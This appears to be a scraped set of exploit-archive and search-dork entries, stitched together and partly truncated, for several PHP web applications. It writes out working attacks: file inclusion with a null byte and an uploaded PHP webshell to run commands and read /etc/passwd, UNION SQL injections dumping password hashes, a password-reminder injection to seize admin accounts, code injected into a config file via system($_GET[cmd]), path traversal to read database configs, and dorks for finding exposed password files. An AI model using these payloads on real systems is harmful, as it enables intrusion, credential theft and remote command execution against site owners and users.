look at the vulnerable code in ./include/security.inc.php at lines ~80-90 

... 
else 
   { 
   if (isset($l) &amp;&amp; file_exists(C_PATH.'/languages/'.$l.'/'.$l.'.php') &amp;&amp; $l != '') 
      {      
         include_once C_PATH.'/languages/'.$l.'/'.$l.'.php'; 
         include_once C_PATH.'/languages/'.$l.'/'.$l.'_.php'; 
   } 
... 

you can include arbitrary file on the server using &quot;../&quot; and null byte (%00) (to truncate path to 
the filename you choose), example: 

http://[target]/[path]/azdg//include/security.inc.php?l=../../../../../../../[filename.ext]%00 

at the begin of the script we have: 


@ob_start(); 

look at the php ob_ start man page : 

&quot;This function will turn output buffering on. While output buffering is active no output is 
sent from the script (other than headers), instead the output is stored in an internal buffer.&quot; 

However, this is not a secure way to protect a script: 
buffer is never showned, so you cannot see arbitrary file from the target machine this time ... but 
you can execute arbirtrary commands and after to see any file :) : 

when you register to azdg you can upload photos, so you can upload and include a gif or jpeg file like this: 

&lt;?php error_reporting(0); system($HTTP_GET_VARS[cmd].' &gt; temp.txt'); ?&gt; 

usually photos are uploaded to ./members/uploads/[subdir]/[newfilename].[ext] 
azdg calculates [subdir] &amp; [newfilename] using date(), time() and rand() functions 
you cannot calculate but you can retrieve the filename from azdg pages when file 
is showned on screen (!), so you can do this: 

http://[target]/[path]/azdg//include/security.inc.php?l=../../../members/uploads/[subdir]/[filename.ext]%00&amp;cmd=cat%20/etc/passwd 

the output will be redirected to ./include/temp.txt 

so you make a GET request of this file and you have /etc/passwd file

	<textualDescription>Land Down Under is prone to an HTML injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.

Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.

site: http://www.mylittlehomepage.net/my_little_forum
software: &quot;A simple web-forum that supports classical thread view (message tree)
as well as messagebord view to display the messages.
Requires PHP &gt; 4.1 and a MySQL database.&quot;


1) look at the vulnerable code at line 144 inside search.php:
...
 $result = mysql_query(&quot;SELECT id, pid, tid, DATE_FORMAT(time + INTERVAL &quot;.
 $time_difference.&quot; HOUR,'&quot;.$lang['time_format'].&quot;') AS Uhrzeit,
 DATE_FORMAT(time + INTERVAL &quot;.$time_difference.&quot; HOUR, '&quot;.$lang['time_format'].&quot;')
 AS Datum, subject, name, email, hp, place, text, category FROM &quot;.$forum_table.&quot;
 WHERE &quot;.$search_string.&quot; ORDER BY tid DESC, time ASC LIMIT &quot;.$ul.&quot;, &quot;
 .$settings['search_results_per_page'], $connid);
...

now goto the search page, select &quot;phrase&quot;, and type:

[whatever]%' UNION SELECT user_pw, user_pw, user_pw, user_pw, user_pw, user_pw,
user_pw, user_pw, user_pw, user_pw, user_pw, user_pw FROM forum_userdata where
user_name='[username]' /*

if magic quotes are off you will have (guess?...) any admin/user password hash
'cause $searchstring var is not filtered...

u can fin my poc exploit here:

http://rgod.altervista.org/mylittle15_16b.html


2) 1.6beta is vulnerable even, we have:
...
$result = mysql_query(&quot;SELECT id, pid, tid, UNIX_TIMESTAMP(time + INTERVAL &quot;.$time_difference.&quot; HOUR) AS
Uhrzeit, subject, name, email, hp, place, text, category FROM &quot;.$db_settings['forum_table'].&quot;
WHERE &quot;.$search_string.&quot; ORDER BY tid DESC, time ASC LIMIT &quot;.$ul.&quot;, &quot;.$settings['search_results_per_page'],
$connid);
...

you have same results, deleting a statement in injection string:

[whatever]%' UNION SELECT user_pw, user_pw, user_pw, user_pw, user_pw, user_pw,
user_pw, user_pw, user_pw, user_pw, user_pw FROM forum_userdata where
user_name='[username]' /*</textualDescription>

	<textualDescription>MailGust 1.9/2.0 (possibly prior versions) SQL injection / board takevor

software:
site: http://www.mailgust.org/
description:
Mailgust is three softwares in one: 
* Mailing list manager 
* Newsletter distribution tool 
* Message Board 
Mailgust is written in php and uses a mysql database. 

vulnerability:

if magic quotes off -&gt; SQL Injection
without to have an account, a user can send himself a new admin password using
password reminder, in email field type:

[yuor_email],'or'a'='a'/*@hotmail.com

give a look to what happen:

220 [MAILSERVER] SMTP Service ready
HELO [MAILGUST]
250  [MAILSERVER].
MAIL FROM:&lt;me@localhost.com&gt;
250 MAIL FROM:&lt;me@localhost.com&gt; OK
RCPT TO:&lt;[your_email]&gt;
250 RCPT TO:&gt;[your_email] OK
RCPT TO:&lt;'or'a'='a'/*@hotmail.com&gt;
250 RCPT TO:&lt;'or'a'='a'/*@hotmail.com&gt; OK
DATA
354 Start mail input; end with &lt;CRLF&gt;.&lt;CRLF&gt;
Date: Sat, 24 Sep 2005 16:11:38 +0100
Subject: New password
To: [your_email],'or'a'='a'/*@hotmail.com
From: systemxxx@localhost.com
Your login name is: [admin_email]
Your new password is: 4993587
Click here:
http://localhost/mailgust/index.php?method=activate_new_password&amp;list=maillistuser&amp;pwd=4993587&amp;id=1756185114
to activate the password, than try to log in!

It is recommended that you change your password afterwards.
.
250 &lt;4335105B00009AE2&gt; Mail accepted
QUIT
221 [MAILSERVER] QUIT

vulnerable query is in [path_to_mailgust]/gorum/user_email.php at line 363:
...
$query = &quot;SELECT * FROM $applName&quot;.&quot;_$userClassName &quot;.
             &quot;WHERE email='$this-&gt;email'&quot;;
...

it becomes:

SELECT * FROM maillist_maillistuser WHERE email='[yuor_email],'or'a'='a'/*@hotmail.com'

&quot;or'a'='a'&quot; is always true, so the query is always true, 
script doesn't fail, for mail function, theese are two valid email address,
it will send the mail to [your_email] and to 'or'a'='a'/*@hotmail.com ;)

activate the password, now you can login with [admin_email] as user and new password

this is a very old vulnerability discovered by Xanthic, can't find it in GHDB 
and I am surprised of how it still works... 

register, login, go to: 

http://[target]/[path_to_upb]/admin_members.php 

edit your level to 3 (Admin) and some Admin level to 1 (user), logout, re-login and... boom! 
You see Admin Panel link as I see it?  

The only link to the advisory that I found is this (in Italian):

and I have remote commads xctn for this now, edit site title with this code: 

Ultimate PHP Board&quot;; error_reporting(0); ini_set(&quot;max_execution_time&quot;,0); system($_GET[cmd]); echo &quot; 

now in config.dat we have: 

... 
$title=&quot;Ultimate PHP Board &quot;; error_reporting(0); ini_set(&quot;max_execution_time&quot;,0); system($_GET[cmd]); echo &quot; &quot;; 
... 

in header.php we have: 

... 
include &quot;./db/config.dat&quot;; 
... 

so you can launch commands:

Since the sql id and password are plain text, it's easy to connect to the SQL server once you have this information... especially those that use &quot;server=127.0.0.1&quot; so you know IIS &amp; SQL Server are running on the same box.</textualDescription>

This is a console for Network Monitoring, access beyond the portal will allow you to do various things, such as telnet to internal machines, reboot servers, gain server information such as IP address.

If the Administrators have utilised WUG to its potential, they will have also made full Infrastructure MAPs available.  Access beyond the portal is Gold Information, you would have access to information and services as if you were an Administrator.

In addition, some of the links, allow you to go beyond the portal as a guest user, this still allows reconisance of various servers and details of them, including where they are located physically.

For anybody that is interested, the Login Portal has a SQL based Backend.</textualDescription>

	<textualDescription>this is an osCommerce dork:

or more simply: 

inurl:&quot;extras/update.php&quot; -display (this display some more hosts where error_reporting=0) 

I found this simple exploit, if extras/ folder is inside the www path, you can view all files on target system, including php files and so on, ex: 

http://[target]/[path]/extras/update.php?read_me=0&amp;readme_file=../catalog/includes/configure.php 

http://[target]/[path]/extras/update.php?read_me=0&amp;readme_file=../index.php 

http://[target]/[path]/extras/update.php?read_me=0&amp;readme_file=/etc/fstab 

also, if you succeed to view configure script with database details, you can connect to it trough some 
test scripts inside this folder...

now I read this:

this is actually unpatched/unresolved in 2.2 on Apr 2006</textualDescription>

	<textualDescription>MvBlog is prone to multiple input-validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.

The application is prone to HTML-injection and SQL-injection vulnerabilities. A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation. Arbitrary script code may also be executed in the browser of an unsuspecting user in the context of the affected site; this may help the attacker steal cookie-based authentication credentials and launch other attacks.

it works by showing all the xls files with password:(something)so a downside is that u do get stuff like &quot;password protected&quot;, &quot;password services&quot; etc. (and the same for login)But...
most of the decent ones have the login and password in the text given to you by google, so its easy to seperate the useful ones from the others.</textualDescription>
